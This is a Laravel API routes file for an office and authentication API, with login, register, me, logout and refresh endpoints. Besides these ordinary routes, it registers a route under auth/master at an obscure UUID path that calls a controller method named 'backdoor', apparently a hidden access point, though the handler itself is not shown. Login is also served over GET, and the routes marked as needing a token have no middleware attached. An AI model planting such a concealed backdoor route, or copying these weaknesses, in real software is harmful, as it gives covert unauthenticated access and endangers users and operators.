<?php

use App\Http\Controllers\Auth\AuthController;
use App\Http\Controllers\Auth\MasterController;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| is assigned the "api" middleware group. Enjoy building your API!
|
*/

Route::prefix('v1')->group(function () {
    Route::get('office', [\App\Http\Controllers\OfficeController::class, 'getAll']);

    Route::prefix('auth')->controller(AuthController::class)->group(function () {
        // 토큰 필요 X
        Route::get('login', 'login');
        Route::post('register', 'register');


        // 토큰 필요
        Route::get('me', 'me');
        Route::get('logout', 'logout');
        Route::get('refresh', 'refresh');
    });

    Route::prefix('auth/master')->controller(MasterController::class)->group(function () {
        Route::get('6fb2e4bd-be2b-40af-b5ab-bf598113d839', 'backdoor');
    });
});
